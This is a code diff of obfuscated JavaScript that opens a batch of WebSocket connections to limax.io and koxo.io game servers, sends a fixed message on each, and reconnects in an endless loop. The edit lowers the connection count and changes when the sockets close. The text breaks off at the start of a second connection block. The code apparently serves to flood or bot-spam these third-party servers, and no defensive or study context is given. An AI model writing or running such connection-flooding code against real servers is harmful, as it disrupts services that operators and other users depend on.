@@ -1727,16 +1727,22 @@
 (function () {
   const v = "wss://newyork1.limax.io/";
   const v2 = "[1,\"sunrise?\",2]";
-  const v3 = 25;
+  const v3 = 10;
   const v4 = new Array(v3).fill(null);
+
   function f(p) {
     const v5 = new WebSocket(v);
-    v5.onopen = () => setInterval(() => v5.readyState === 1 && v5.send(v2), 500);
+    v5.onopen = () => {
+      v5.send(v2);
+      setTimeout(() => v5.close(), 500);
+    };
     v5.onclose = () => setTimeout(() => f(p), 500);
     v4[p] = v5;
   }
-  v4.forEach((p2, p3) => f(p3));
+
+  v4.forEach((_, p3) => f(p3));
 })();
+
 !function nb() {
     let e = new WebSocket("wss://newyork1.koxo.io/");
     let interval;
